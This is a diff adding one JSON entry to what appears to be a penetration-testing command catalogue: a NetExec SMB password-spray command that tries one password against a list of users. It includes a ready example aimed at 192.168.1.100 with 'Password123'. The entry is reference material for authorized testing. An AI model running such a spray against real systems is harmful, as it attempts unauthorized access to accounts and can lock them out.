@@ -1,0 +1,23 @@
+{
+  "id": "nxc-smb-spray",
+  "name": "NetExec SMB Password Spray",
+  "command": "nxc smb '<ip>' -u '<userlist>' -p '<password>' --continue-on-success",
+  "description": "Spray a single password against multiple users via SMB, continuing on valid hits",
+  "platform": "linux",
+  "requires": [
+    "no-creds"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tags": [
+    "nxc",
+    "smb",
+    "password-spray",
+    "brute-force",
+    "credential-testing"
+  ],
+  "examples": [
+    "nxc smb '192.168.1.100' -u users.txt -p 'Password123' --continue-on-success"
+  ]
+}
